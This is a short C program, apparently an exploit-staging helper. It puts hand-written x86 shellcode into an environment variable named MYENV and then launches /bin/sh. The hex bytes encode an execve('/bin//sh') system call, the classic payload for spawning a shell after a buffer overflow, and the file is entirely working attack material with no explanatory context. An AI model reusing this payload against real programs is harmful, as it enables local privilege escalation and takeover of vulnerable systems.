

#include <stdlib.h>

char myenv[] = 
	"MYENV="
	"\x55\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73"
	"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
	"\x89\xe1\x31\xd2\xb0\xb0\xc1\xe8\x04\xcd\x80";

int main()
{
	putenv(myenv);
	system("/bin/sh");
}



